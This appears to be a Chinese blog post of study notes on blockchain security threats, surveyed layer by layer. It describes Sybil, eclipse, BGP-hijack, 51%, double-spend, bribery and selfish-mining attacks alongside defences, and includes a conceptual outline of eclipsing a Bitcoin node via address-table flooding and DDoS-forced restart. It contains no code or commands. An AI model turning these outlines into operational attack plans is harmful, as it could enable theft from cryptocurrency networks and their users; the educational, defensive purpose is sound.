      <link href="/2024/11/29/%E9%93%BE%E5%AE%894/"/>
      <url>/2024/11/29/%E9%93%BE%E5%AE%894/</url>
      
        <content type="html"><![CDATA[<h2 id="八-区块链攻击与防御"><a href="#八-区块链攻击与防御" class="headerlink" title="八.区块链攻击与防御"></a>八.<strong>区块链攻击与防御</strong></h2><h3 id="安全威胁分析"><a href="#安全威胁分析" class="headerlink" title="安全威胁分析"></a>安全威胁分析</h3><ul><li>自身结构的复杂性和应用场景的多样性</li><li>恶意攻击者可能针对区块链应用的底层技术缺陷、低耦合性等安全漏洞展开攻击，从而非法攫取利益。</li></ul><p><strong>分类</strong>：</p><p><img src="https://s2.loli.net/2024/11/30/diXLKGDC8yabQsh.png" alt="1.png"></p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="数据层威胁"><a href="#数据层威胁" class="headerlink" title="数据层威胁"></a>数据层威胁</h4><p>数据层、网络层和共识层是区块链技术体系中最基础、最必要的3个层级，而<strong>数据层是其中最重要的一层</strong>，主要涉及区块链的数据结构、数字签名、哈希函数等密码学工具。这些密码学工具在保护区块链数据隐私的同时，其<strong>固有的碰撞攻击、后门攻击</strong>等安全问题也给区块链数据隐私带来了一定威胁。此外，攻击者也可能通过交易延展性攻击和恶意信息攻击破坏交易秩序和区块链网络环境。因此，<strong>区块链数据层面临的安全威胁主要包含数据隐私窃取和恶意数据攻击。</strong></p><p><strong>原因：</strong>区块链的数据层主要负责底层数据的存储，包括交易信息、区块头等关键数据。由于区块链的不可篡改性，一旦数据被写入，修改这些数据是极其困难的。然而，如果攻击者在数据层植入恶意信息或成功篡改已有数据，可能会对整个链的安全性造成威胁。</p><p><strong>类型：</strong>常见的数据层攻击包括<strong>51%攻击，</strong>通过控制大多数计算力来重写区块链历史；以及<strong>时间戳攻击</strong>，即通过操纵时间戳来影响区块的产生。</p><ol><li><p>密码算法的安全风险：如果使用的是低安全强度的密码算法，或者密码算法实现存在错误，那么区块链系统将容易受到攻击，导致数据被篡改或泄露。</p></li><li><p>数据结构逻辑错误：区块链的数据结构如果设计不合理，比如交易数据的树状组织不当，可能会导致解析错误，从而影响整个系统的稳定性和安全性。</p></li><li><p>数据隐私窃取：由于区块链的透明性特点，所有交易数据都是公开的，这可能导致用户隐私信息的泄露。因此，如何保护用户的隐私成为了一个重要的安全问题。</p></li><li><p>恶意数据攻击：区块链数据层可能会遭受恶意数据的注入，这些数据可能是为了破坏区块链的正常运行或者是企图篡改历史记录。</p></li><li><p>硬件安全：区块链系统通常依赖于特定的硬件环境，如果硬件存在安全漏洞，比如固件中的后门或硬件设备的物理损坏，也会影响到数据层的安全。</p></li></ol><p>采取有效的防御措施至关重要。例如，采用高强度的密码算法、确保数据结构的合理性和加强数据隐私保护措施</p><h4 id="网络层威胁"><a href="#网络层威胁" class="headerlink" title="网络层威胁"></a>网络层威胁</h4><p>   网络层是区块链技术体系中最基础的层级，主要包含<strong>P2P网络组网方式、消息传播协议等模块，赋予了区块链去中心化、不可删除、不可篡改的技术特性</strong>。区块链网络层面临的安全威胁主要是针对P2P网络的恶意攻击，攻击者可能通过漏洞植入、路由劫持、资源占用等方式扰乱区块链网络的正常运行，也有可能利用交易延迟攻击来破坏区块链网络交易环境。</p><p><strong>原因：</strong>网络层负责节点间的通信和数据传输。如果攻击者能够控制或干扰节点之间的通信，那么他们可以发起拒绝服务攻击（DoS），或者更隐蔽地修改传输中的数据，从而污染整个网络的信息。</p><p><strong>类型：</strong>网络层的攻击包括日蚀攻击，即隔离某些节点使其只与攻击者控制的节点通信；以及路由攻击，攻击者破坏或操纵网络的路由表来干扰数据传输。</p><h4 id="共识层威胁"><a href="#共识层威胁" class="headerlink" title="共识层威胁"></a><strong>共识层威胁</strong></h4><p>   共识层是区块链技术体系的核心架构。</p><p>其中的<strong>共识算法可以保证全网节点在去信任化的场景中对分布式账本数据达成共识，为区块链的去中心化、信任化提供了保障</strong>。</p><p>在授权共识机制中，各节点对共识过程的影响相同，所以易遭受女巫攻击；而在非授权共识机制中，各对等节点利用自身所持资源（如算力、权益）竞争记账权，进而达成共识。</p><p>投入的资源越多，则成功率越高，因此易遭受51%攻击。攻击者可能出于利益目的，通过贿赂攻击、币龄累计攻击等方式非法获取大量资源，从而发起51%攻击，以实现代币双花、历史修复、期货卖空、自私挖矿等目的。此外，攻击者还可以通过无利害关系攻击、预计算攻击等方式影响全网共识进程，进而获利。</p><p>共识层面临的安全威胁主要是，攻击者可以通过各种手段阻止全网节点达成正确的共识。</p><p>原因：共识层是区块链设计中的核心部分，它确保所有节点同意一份相同的数据记录。这一层的安全问题通常涉及操纵共识机制以达到非法获利或破坏系统的目的。</p><p>类型：自私挖矿是一种共识层的攻击方式，攻击者私下挖掘区块并隐瞒，直到能够获得比诚实节点更长的链时再公布，从而实现双花攻击。</p><hr><h5 id="关于女巫攻击"><a href="#关于女巫攻击" class="headerlink" title="关于女巫攻击"></a>关于女巫攻击</h5><p>   Sybil攻击，又称为女巫攻击，<strong>指一个恶意节点非法的对外呈现多个身份</strong>，通常把该结点的这些身份称为Sybil结点。Sybil攻击方式有以下几种类型：直接通信、间接通信、伪造身份、盗用身份、同时攻击、非同时攻击。</p><p>​在区块链网络中，用户创建新身份或新节点是不需要代价的，攻击者利用这一漏洞发动Sybil攻击，<strong>伪造自己的身份加入网络，在掌握了若干节点或节点身份之后，随意做出一些恶意的行为</strong>。例如降低区块链网络节点的查找效率；或者网络中传输非授权文件、破坏文件共享安全、消耗节点间的连接资源等。</p><hr><h5 id="关于Eclipse攻击"><a href="#关于Eclipse攻击" class="headerlink" title="关于Eclipse攻击"></a>关于Eclipse攻击</h5><p>Eclipse攻击是指攻击者通过侵占节点的路由表，<strong>将足够多的虚假节点添加到某些节点的邻居节点集合中</strong>，从而将这些节点“隔离”于正常区块链网络之外。</p><p>   当节点受到Eclipse攻击时，节点的大部分对外联系都会被恶意节点所控制，由此恶意节点得以进一步实施路由欺骗、存储污染、拒绝服务以及ID劫持等攻击行为。Eclipse攻击原理如图所示：</p><p><img src="https://s2.loli.net/2024/11/30/esoESXaZTVwzFAJ.png" alt="2.png"></p><p>Eclipse攻击者<strong>不断的向区块链节点发送路由表更新信息来影响区块链节点的路由表</strong>，使普通节点的路由表充满虚假节点。当区块链节点的路由表虚假节点占较高比例时，它对区块链网络的正常行为（如路由查找、资源搜索）都会被恶意节点所隔绝。</p><p>Eclipse攻击和Sybil攻击密切相关，它<strong>需要较多的Sybil攻击节点相配合</strong>。为了实现对特定区块链节点群的Eclipse攻击，攻击者需要先设置足够多的Sybil攻击节点，并向区块链网络宣称他们是“正常节点”，然后利用这些Sybil节点和正常的节点通信，入侵其路由表，最终把他们从区块链网络中隔离出去。</p><p>   Eclipse攻击<strong>破坏了区块链网络的拓扑结构，减少了节点数目，使区块链网络资源共享的效率大大降低</strong>，极端情况下，它可以控制整个网络，将其分割成若干个区块链网络区域。对受害节点来说，它在未知情况下脱离区块链网络，所有区块链网络请求消息都会被攻击者劫持。</p><hr><h4 id="合约层攻击"><a href="#合约层攻击" class="headerlink" title="合约层攻击"></a>合约层攻击</h4><p>合约层是区块链实现点对点可信交互的重要保障，主要包括智能合约的各类脚本代码、算法机制等，是区块链2.0的重要标志。<strong>合约层面临的安全威胁可以分为智能合约漏洞和合约虚拟机（EVM）漏洞</strong>：智能合约漏洞通常是由开发者的不规范编程或攻击者恶意漏洞植入导致的，而合约虚拟机漏洞则是由不合理的代码应用和设计导致的。</p><p>首先是智能合约编程导致的漏洞，这类漏洞通常是由于开发者在编写智能合约时的不规范编程或者疏忽导致的；其次是合约虚拟机漏洞，合约虚拟机（Ethereum Virtual Machine，EVM）是以太坊上智能合约运行的环境，如果EVM存在漏洞，那么所有运行在该环境上的智能合约都可能受到影响。</p><p>类型：重入攻击（reentrancy attack）或者前置运行攻击（front-running attack）用于破坏合约的正常执行或者盗取资产；DAO攻击就是利用当时以太坊智能合约和EVM中的递归调用漏洞来实现的。</p><h4 id="应用层威胁"><a href="#应用层威胁" class="headerlink" title="应用层威胁"></a>应用层威胁</h4><p>应用层是区块链技术的应用载体，为各种业务场景提供解决方案，可分为记账和区块链交易两类场景。（<strong>应用层是用户与区块链系统交互的层面，包括智能合约和去中心化应用</strong>（Decentralized Applications，DApps）。智能合约的代码如果有漏洞，就可能成为攻击的目标）</p><p>   在记账场景中，攻击者可能通过漏洞植入、网络渗透、地址篡改等方式攻击记账系统，从而非法获利；“聪明”的记账系统也可能利用记账机制的漏洞，通过算力伪造攻击、扣块攻击、丢弃攻击等方式谋求最大化的收益。</p><p>​    在区块链交易场景中，攻击者可能利用撞库攻击、0day漏洞、API接口攻击等方式非法获取交易平台中用户的隐私信息，也可能通过钓鱼攻击、木马劫持攻击等方式获取用户账户的隐私和资产。</p><p>类型：智能合约漏洞利用是一种常见的应用层攻击，攻击者通过调用存在缺陷的智能合约来盗取资产或破坏应用逻辑。</p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>   在实际的区块链攻击场景中，攻击者发起攻击旨在非法获取最大化的利益，但并不是所有的区块链攻击方式都可以使攻击者直接获利。此外，部分区块链攻击对实施场景和条件要求过高，使得其可行性受到了严重的制约。因此，攻击者通常采用一系列跨层级的区块链攻击方式来实现最大化的获利目的，这种攻击序列为攻击簇。</p><p>   例如：现实场景中，攻击者利用自身资源发起51%攻击是不现实的，所以他们可能通过傀儡记账、贿赂攻击、币龄累计攻击等方式非法获取记账权竞争资源，然后发起51%攻击，进而实现双花攻击、历史修复攻击、卖空攻击等。显然，研究区块链安全态势，不仅要从层级分类的横向维度对单个攻击展开分析，还要从攻击关联分析的纵向维度对跨层级的攻击簇进行研究，才有可能构建出全面有效的区块链安全防御体系。</p><h2 id="攻击类型分析"><a href="#攻击类型分析" class="headerlink" title="攻击类型分析"></a>攻击类型分析</h2><h3 id="网络层攻击类型分析"><a href="#网络层攻击类型分析" class="headerlink" title="网络层攻击类型分析"></a>网络层攻击类型分析</h3><p>   网络层是区块链技术体系中最基础的技术架构，封装了区块链系统的组网方式、消息传播协议和数据验证机制等要素，使区块链具备了去中心化、不可篡改的技术特性。</p><p>   区块链网络是由P2P网络构建，P2P网络主要涉及用户客户端和对等网络结构，P2P网络的攻击可能针对这两个方面展开如下攻击：</p><p>（1）客户端漏洞（client vulnerability）： 尽管现有全节点客户端的底层协议互相兼容，增强了比特币网络的健壮性，但客户端代码中可能存在诸多安全漏洞，并且这些漏洞会随着客户端类型的增加而增加 。攻击者可以利用0day漏洞扫描等技术扫描客户端中存在的漏洞，然后利用这些漏洞发起各种攻击。2018年，区块链安全公司Peck Shield披露了一个安全漏洞，攻击者可以向以太坊客户端发送特定恶意报文，导致2&#x2F;3的以太坊节点下线。</p><p>（2）窃听攻击（eavesdropping attack）：攻击者可以通过网络窃听，获取区块链用户节点的网络标识，并将其与IP地址关联起来，进而获取用户节点的隐私信息，甚至可以追溯到用户的实际家庭地址。以比特币为例，用户通过连接一组服务器来加入比特币网络，这个初始连接集合就是该用户的唯一入口节点。攻击者可以通过与比特币服务器建立多个连接，以窃听客户端与服务器端的初始连接，获得客户端的IP地址。随着交易流经网络，攻击者将窃听得到的IP地址与已有的客户端入口节点进行匹配，若成功，则攻击者便可获知交易的来源。</p><p>（3）日蚀攻击（eclipse attack）：攻击者通过特定手段使得目标节点只能获得被操纵的、伪造的网络视图，将其从实际的网络视图中隔离出来，从而妨碍目标节点正常运转，以达成特定的攻击目的。攻击者操纵多个对等节点与目标节点保持长时间的传输连接，使其在线链接数达到目标节点的入站连接上限，从而阻止其他合法节点的连接请求。此时，目标节点被攻击者从P2P网络中“隔离”出来，导致目标节点无法正常维护区块链账本。</p><p> <strong>日蚀攻击的实施方法如下</strong>：</p><ul><li><p>攻击者可以通过某种方法把正常的比特币节点的输出连接都连接到攻击者控制的恶意节点，同时比特币节点的输入连接都被恶意节点连满。那如何做到让正常的比特币节点都连接到恶意的节点呢？在比特币节点中有两张表，一张叫作NewTable，用来保持当前节点所感知到的网络中其他节点的地址；另一张叫作TriedTable，用于保存曾经连接过的节点。 比特币节点每次建立输出连接的，都是在这两张表中选择一个时间戳较新的节点连接。通过控制僵尸网络不断地去连接这个比特币节点，即可达到刷新这两张表的目的，使得这两张表保存了大量的恶意节点的地址信息。</p></li><li><p>攻击者再通过DDoS攻击等方法，让这个比特币节点重启。这样这个比特币节点连到的就都是攻击者控制的恶意节点了。</p></li><li><p>边界网关协议（border gateway protocol，简称BGP）劫持攻击：BGP是因特网的关键组成部分，攻击者可以通过劫持BGP来实现操纵互联网路由路径的目的。由于区块链是基于互联网来传递信息的，劫持BGP可以实现对区块链节点流量的误导和拦截。攻击者一旦接管了节点的流量，就可以通过影响区块链网络的正常运行来破坏共识和交易进程。例如，比特币系统的大部分节点都被托管至几个特定的互联网服务提供商，大约60%的比特币连接都会通过这些特定服务商，所以攻击者一旦接管了这部分流量，将可以通过BGP路由劫持破坏区块链网络的完整性，甚至导致区块链网络瘫痪。</p></li><li><p>分割攻击（segmentation attack）：攻击者通过BGP劫持攻击将区块链网络划分成两个或多个不相交的网络，此时的区块链会分叉为两条或多条并行支链。攻击者可以在多个支链网络中将同一笔电子货币兑换成现实商品或法币。BGP劫持攻击停止后，区块链重新统一，以最长的链为主链，其他的链上的交易、奖励等全部失效，攻击者由此获利。</p></li><li><p>DoS攻击（denial-of-service attack）：即拒绝服务攻击，攻击者利用大量网络资源攻击计算机系统或网络，使其停止响应甚至崩溃，从而拒绝服务。实际中，用户节点资源通常受限，攻击者只能通过分布式DoS攻击（distributed denial-of-service，简称DDoS）整合零散网络带宽来实施DoS攻击。2017年5月，Poloniex交易平台遭受了严重的DDoS攻击，导致比特币价格被锁定在1761美元，用户无法正常执行交易。此外，当区块链网络中的大部分矿工无法盈利时，可能通过拒绝为区块链网络服务而发起BDoS攻击（blockchain denial of service，简称BDoS），导致区块链网络瘫痪。</p></li><li><p>交易延迟攻击（transaction delay attack）：比特币闪电网络（lightning network）通常使用哈希时间锁定技术来实现安全的资产原子交换，其安全性主要依赖于时间锁定和资金锁定。由于每一笔资金交换都需要通过时间锁定来规定该交易必须在某个时间段内完成。一些恶意节点短时间内建立大量交易，然后故意超时发送，致使网络发生阻塞，影响正常运作。</p><p> 网络层攻击的主要攻击目标是区块链底层的P2P网络，其共性在于攻击者都是通过扰乱用户的之间的通信，从而达到不同的攻击目的。根据攻击方式的特性，区块链网络层攻击大致可以分为信息窃取类攻击、网络路由劫持类攻击和恶意资源占用类攻击。</p></li></ul><p>（1）信息窃取类攻击：主要包括客户端代码漏洞和窃听攻击。在针对客户端代码漏洞的攻击场景中，攻击者利用的漏洞可能是预先恶意植入的后门，也可能是开发人员编写错误导致的。理论上，无法完全杜绝类似的漏洞，所以开发商应在软件安全开发生命周期内，通过Fuzzing、代码审计、逆向漏洞分析、反逆向工程等技术对客户端的安全性进行评估，以缓解类似漏洞带给用户的安全威胁。</p><p>  在窃听攻击场景中，攻击者可以通过网络监听等手段获取用户身份、地址等隐私信息，其关键在于用户的区块链网络标识唯一，攻击者可以将窃听得到的IP地址与已有的客户端入口节点进行匹配，从而获得交易数据来源和用户隐私。为了预防窃听攻击，用户应采用混淆的交易方法来打破交易过程中用户唯一标识与IP地址之间的一一对应关系。具体地，多个用户可以通过共享唯一网络标识，实现“一对多”或“多对一”的交易，以此混淆用户唯一标识与IP地址之间的一一对应关系，使得攻击者无法通过匹配用户标识和IP地址来获取用户隐私。此外，在交易数据的传输过程中，应使用可靠的加密算法实现数据的加密传输，防止恶意攻击者对网络节点的信息进行窃取。</p><p>（2）网络路由劫持类攻击：主要包括日蚀攻击、BGP劫持攻击和分割攻击，它们的攻击原理相似，攻击目标分别为单个节点、节点集合和P2P网络。攻击者通过改变节点的网络视图，将目标节点集合从区块链网络中隔离出来，从而达成控制区块链网络的目的。以比特币系统为例，攻击者可以通过这3种攻击迫使部分矿工节点“离线”，导致区块链全网实际算力的流失，从而使攻击者的算力在全网总算力中的占比不断上升。当算力超过全网算力的一半时，攻击者可以以远低于原全网51%的算力发动51%攻击。与通过提升自身算力来实施51%攻击的方式相比，通过日蚀攻击和BGP劫持攻击来提升自身攻击优势的方式更加经济。攻击者之所以可以发起日蚀攻击，其关键在于目标节点无法判断已连接节点的身份。为了预防日蚀攻击，Letz等人提出了共识信誉机制BlockQuick。BlockQuick中的网络节点在接受新产生的区块时，会对矿工的加密签名进行验证，并将该矿工的身份与共识信誉表中已知矿工的身份进行比对。最终，当共识得分大于50%时，网络节点才会接受该区块；否则，节点察觉出攻击者的日蚀攻击行为并拒绝该区块。而在BGP劫持攻击和分割攻击场景中，攻击者主要通过BGP路由劫持实现网络视图分割。针对这个问题，研究人员提出了自动实时检测与缓解系统（ARTEMIS），可以在几分钟内帮助服务提供商解决BGP劫持问题，使得实时流的公共BGP监控服务成为可能。</p><p>（3）恶意资源占用类攻击：DoS，DDoS攻击属于通过恶意资源占用实现的拒绝服务攻击，目前已经存在很多有效的防御工具，如DoS防火墙等。而BDoS和交易延迟攻击则属于社会工程学类攻击，解决此类攻击只能通过不断完善激励制度和奖惩制度、优化网络环境等社会工程学手段。</p><h3 id="共识层攻击类型分析与防御"><a href="#共识层攻击类型分析与防御" class="headerlink" title="共识层攻击类型分析与防御"></a>共识层攻击类型分析与防御</h3><p>   针对非授权共识机制的攻击。 非授权共识机制是指在非授权网络（公有链）中，节点无需身份认证，即可加入网络与其他节点为达成某种共识而共同运行的特定共识算法。经典非授权共识算法包括工作量证明机制（proof of work，简称PoW）、权益证明机制（proof of stake，简称PoS）、信誉证明机制（proof of reputation，简称PoR）及其衍生算法。委托权益证明机制（delegated proof of stake，简称DPoS）、评价证明机制（proof of review，简称PoR）、PoR&#x2F;PoS混合共识机制（PoR&#x2F;PoS-hybrid）等。授权共识算法中，各节点达成共识消耗的是等价的参与权，即节点共识权重相等。而在非授权共识机制中，各节点通过消耗自身持有的“筹码”（PoW中代表算力Work，PoS中代表权益Stake）竞争记账权，进而达成共识，即节点共识权重不相等。 非授权共识机制可以在本轮竞争“总筹码”为N&#x3D;2n+1、恶意节点持有“筹码”不超过n的情况下，确保全网节点达成正确共识（容错率为1&#x2F;2）。</p><p>   恶意筹码获取。在非授权的共识机制中，节点持有的“筹码”越多，则其获得记账权的可能性越大。所以节点可能通过傀儡挖矿、贿赂攻击、币龄累计攻击等方式获取“筹码”，以提高自己获得记账权的成功率。</p><p> （1）傀儡挖矿攻击（puppet attack）：攻击者通过植入木马入侵大量网络节点，部署挖矿程序，盗用被入侵主机的电力、算力等资源挖矿获利。2018年初，上百款《荒野行动》游戏辅助被植入挖矿木马，利用游戏主机显卡的高性能来挖矿获利。同年，攻击者在大量网站的首页植入Coinhive平台的门罗币（Monero）的挖矿代码，通过网页端盗用网络节点资源挖矿获利，导致该网站用户的系统运行变慢。</p><p> （2）币龄累计攻击（coin age accumulation attack）：在基于“POW+POS”混合共识机制的区块链中，节点持有的“筹码”不仅与其算力有关，还与其持有的币龄有关。持币量越多、持币时间越长，则节点持有的币龄越多。因此，节点可以通过币龄累计攻击来获取更多的“筹码”。买入一定数量代币后，持有足够长时间后，就可以获得足够多的币龄用于竞争记账权。</p><p> （3）贿赂攻击（the bribing attack）:攻击者通过“恶意悬赏”，鼓励矿工在攻击者指定的支链上进行挖矿，当支链挖矿投入的“筹码”超过全网总筹码的一半时，攻击者便通过51%攻击实现双花攻击、历史修复攻击、卖空攻击等。在PoW中，贿赂攻击可以看作是一种算力租借方式，被贿赂矿工需要消耗大量算力来挖矿，因此攻击者的攻击成本较高；而在PoS共识机制中，被贿赂节点不需要消耗大量算力，以较低成本便可赚取攻击者的悬赏，因此贿赂攻击所需的成本较低，常见于PoS系统。</p><p>   除了通过增加“筹码”提高筹码占比的方法以外，攻击者还可能通过网络层日蚀攻击、BGP路由劫持、分割攻击等手段迫使大量节点离线，使区块链网络的总算力流失，从而提高自己的记账权竞争筹码占比和记账权竞争的成功率。</p><p>   51%攻击。一旦存在恶意节点持有的“筹码”超过本轮记账权竞争总“筹码”的一半，则其可以以较大的优势获得记账权，并主导区块链达成特定共识，该攻击被称为短程51%攻击 ；也可以利用资源优势计算并生成一条区块链支链，使其长度超过当前主链，并代替成为新的主链，这种攻击被称为长程51%攻击。</p><p>   在实际的区块链网络中，攻击者可能将51%攻击作为一种子攻击，进而实现以下几类攻击。</p><p> （1）双花攻击（double spending attack）:以比特币系统为例，攻击者在完成交易A后，针对A花费的代币伪造交易B，并发动长程51%攻击，将一条包含交易B的支链变成新的主链。如此，攻击者对相同的一组代币实现了“双重花费” 。2016年8月，基于以太坊的数字货币Krypton遭受了名为“51%Crew”的51%攻击，攻击者通过租用Nicehash（算力买卖市场）的算力，导致该区块链损失约21465KR的代币。2018年，比特币黄金社区的一位成员发文称：有人在尝试进行针对交易所的双花攻击，这一攻击造成了千万美元的损失，同时引起了人们对于去中心化和PoW机制的质疑。</p><p> （2）历史修复攻击（history-revision attack）：在区块链网络中，当攻击者无法持续拥有超过竞争本轮记账权总筹码的一半以上筹码时，攻击者和诚实节点的身份可能发生颠倒，并导致多轮51%攻击。 具体地，当攻击者A成功发起51%攻击将他的支链变为主链时，之前的主链变为支链，诚实节点B变为“恶意节点”，A成为“诚实节点”。一旦B获得超过新一轮记账权总筹码的一半时，便可作为“攻击者”发起51%攻击，将他们的“支链”恢复为主链，此时称B发起了历史修复攻击。</p><p> （3）卖空攻击（shot selling attack）：51%攻击会破坏区块链系统，导致其对应的代币贬值。尤其是在PoS共识机制下，“聪明”的矿工一般不会对基于PoS的区块链系统发动51%攻击。因为攻击者成功发起51%攻击，意味着其持有大量代币，而代币贬值将会给攻击者带来巨大的经济损失。但在支持证券信用交易的PoS系统中，攻击者可能通过51%攻击发起卖空攻击来牟取暴利，具体步骤如下：</p><p>①攻击者持有数量为A的代币，这些代币的权益需超过本轮投票总权益的一半以上。</p><p>②攻击者通过证券信用交易或金融借贷等手段获得数量为B的代币，B的数量远大于A。这里的B是攻击者所借的证券，攻击结束后，需返还等额的代币给借贷方，如交易所。</p><p>③攻击者将所借的代币套现，兑换为具备实际价值的经济实体或货币。</p><p>④攻击者使用双花攻击、传统网络攻击等手段恶意影响区块链网络的正常运作，从而使得基于该区块链的数字货币贬值，此处将贬值率记为Δ。攻击者回购数量为B的代币偿还给借款方，最终获利Δ（B-A）。</p><p> （4）自私挖矿攻击（selfish mining attack）：与双花攻击不同，自私挖矿攻击是一种利用短程51%攻击持续性获取记账权，进而赚取奖励的攻击方式，常见于PoW系统中。攻击者通过短程51%攻击，以较大优势比其他节点先挖到“矿”，暂扣区块并赶在其他节点之前公布出来，以获取记账权并赚取奖励。在延迟公布期间，攻击者沿着之前的区块继续挖矿，以积攒更多的优势，保证他可以连续获得奖励 。这种攻击不会破坏比特币的运行机制，但会使其他节点的工作量无效化，浪费了大量的算力。</p><h4 id="其他攻击分析如下："><a href="#其他攻击分析如下：" class="headerlink" title="其他攻击分析如下："></a>其他攻击分析如下：</h4><p>（1）无利害关系攻击（nothing at stake attack）：这是一种针对PoS共识机制的攻击方式，攻击者可以在区块链产生分叉时，使用权益同时为多个分叉出块，以获取最大化的收益。由于攻击者无需像在PoW系统中消耗大量算力，只需进行权益投票便可实现利益最大化，因此也被称为“作恶无成本，好处无限多”的无利害关系问题，这变相地鼓励了区块链分叉的产生。“聪明”的矿工往往采取“在每条分叉上同时挖矿”的最佳策略以获取最大收益，这将导致区块链产生过多分叉，不再是唯一链。全网节点也因此无法达成共识，进而引起双花攻击、非法交易的泛滥。</p><p>（2）预计算攻击（pre-computation attack）：在“PoW+PoS”混合共识机制中，当前区块难度取决于前一区块参数（如哈希值）。攻击者可以在生成区块时，通过随机试错法计算并选择一个对自己产生下一区块最有利的参数。通过这种方式，攻击者有更大的优势可以获得下一区块的奖励。</p><p> （3）长距离攻击（long range attack）：PoS系统中，区块的生成速度比PoW快很多，所以攻击者可能尝试通过重写区块链账本，从而实现代币双花等目的。这种攻击和PoW中的长程51%攻击的原理相似 ，区别在于长距离攻击中，攻击者不用消耗大量算力，便可能伪造出一条新的区块链主链 ，攻击成本更低，所以带来的安全威胁更大。</p><p>   <strong>共识层攻击的主要攻击目标是影响区块链的共识进程</strong> ，其<strong>共性在于攻击者都是利用共识机制的特点或缺陷来提高自身竞争记账权的成功率，从而使区块链沿着对攻击者有利的方向发展</strong> ，以实现妨碍网络正常运行、货币双花、最大获利等实际目的。其特性则在于各个攻击的场景、目的、方式的不同。<strong>授权共识机制中，攻击者持有的有效节点身份数量是影响共识进程的关键。而在非授权共识机制中，算力、权益等类型的资源才是影响共识进程的关键。</strong> 同时，攻击者为了获取更多资源，可能采用诸多恶意的筹码获取手段来提升自己竞争记账权的成功率。此外，在一些特殊的系统中，攻击者无需积累“资源”便可实现最大化收益。</p><p>   在授权共识机制中，攻击者需持有超过全网1&#x2F;3的节点才有可能主导区块链网络达成有利于自己的共识即攻击者操纵了多个节点身份，发起了女巫攻击。在女巫攻击的场景中，攻击者可能通过伪造等手段获取多个节点身份，也可能通过胁迫、腐化等手段控制多个节点，而其他节点无法检测、判断出攻击者持有节点身份的数量及其之间的内部关系。因此，阻止女巫攻击的关键在于阻止攻击者获取多重身份，可以考虑以下策略。</p><p> （1）采用节点身份验证机制，通过身份验证防止攻击者伪造节点身份。目前，部分私有链采用了PoA共识机制，如Aura、Clique等，该机制通过随机密钥分发与基于公钥体制的认证方式，使得攻击者无法在区块链网络中伪造多个身份，在一定程度上缓解了女巫攻击。</p><p> （2）<strong>采用高成本的多身份申请机制，通过提高身份伪造成本缓解女巫攻击。</strong> 尽管节点身份验证机制可以阻止攻击者伪造身份，但在实际中，这种方式无法满足诚实节点对多节点身份的正常需求。因此，可以考虑在区块链中引入首次申请身份免费、多次申请成本指数式升高的身份申请机制，在满足节点对多身份正常需求的同时，指数式增加攻击者的攻击成本，缓解女巫攻击带来的安全威胁。</p><p> 理论上，女巫攻击也可以出现在非授权的共识场景中，但由于非授权共识算法中的节点是通过自身持有的“筹码”竞争记账权，多重身份伪造意味着攻击者“筹码”的分流，但“筹码”总量不会发生变化，而攻击者实施女巫攻击不但不能提高自己获得记账权的成功率，反而有可能导致其成功率降低，所以女巫攻击不会对非授权共识机制的共识过程产生实质性影响。</p><p>   克隆攻击是一种专门针对PoA系统的攻击方式，攻击者成功实施克隆攻击的关键，一方面在于PoA系统中记账节点集合恒定不变的固有缺陷，另一方面在于攻击者是否能通过BGP劫持攻击、分割攻击成功实现网络分区。因此，解决克隆攻击的关键在于如何阻止攻击者成功实施BGP劫持攻击、分割攻击，所以可以考虑采用ARTEMIS系统预防攻击者进行网络分区，从源头阻止克隆攻击。然而，ARTEMIS系统只能在网络发生异常时发现区块链网络是否发生分区，如果攻击者仅对部分关键数据进行管控而不影响其他数据的正常传递，则ARTEMIS也无法阻止此类“无特征”的克隆攻击。此时，准备出块的区块链节点可以考虑引入基于权重的节点活性检测方法，主动检测区块链网络是否发生网络分区。具体地，区块链节点可以通过随机取样的方式选取区块链中已有的区块，根据其中包含的交易类型、金额、数量等特征计算出该区块生成者的权重。然后随机选择节点并请求包含其心跳信息和上一区块哈希值在内的活性证明，如果该节点成功证明自身活性，则验证者累计已验证节点的权重，并重复上述操作直至累计权重达到预先设置的阈值；若被选中节点未通过或未参与活性检测，则证明区块链网络发生分区，应立即停止出块。尽管该方法与ARTEMIS无法从根本上阻止攻击者在PoA系统中实施克隆攻击，但能够在一定程度上预防并缓解克隆攻击来的危害，避免损失。</p><p>   在非授权共识机制中，攻击者在本轮“记账权”竞争中需持有超过全网1&#x2F;2的“筹码”，才有可能通过51%攻击主导区块链网络达成有利于自己的共识，进而实现双花攻击、历史修复攻击、卖空攻击等目的。而实际中，攻击者通常很难自己拥有足够的“筹码”来实施51%攻击，所以可能会通过各种手段获取“筹码”。为了预防51%攻击区块链网络应该采取如下策略，阻止攻击者通过傀儡挖矿攻击、贿赂攻击等方法获取“筹码”。</p><p>（1）加强区块链客户端的入侵检测能力，添加防火墙，阻止攻击者通过木马病毒入侵网络节点，盗用受害节点的挖矿资源。</p><p>（2）采用针对“恶意悬赏”的惩罚机制，缓解贿赂攻击带来的危害。全网节点可以对抵制恶意悬赏、恶意攻击达成共识，缴纳保证金并签订智能合约。一旦出现恶意悬赏，则对举报者进行奖励，对恶意节点进行惩罚，没收悬赏金额和保证金，限制其网络交易权限。</p><p> （3）在PoS中采用新型的币龄计算方法，限制节点恶意累计币龄的行为。如：点点币通过在币龄计算方法中设置节点持币时间上限的方式，限制了用户所持币龄的上限，在一定程度上阻止了51%攻击。</p><p> （4）在PoS中采用币龄预警、清零机制，预防51%攻击。在记账权竞争过程中，对节点进行身份认证和权益关联。若发现单节点或关联节点所持权益超过全网一半，则启动预警机制，阻止共识进程，然后清空恶意节点持有的全部币龄，并处罚金。</p><p>   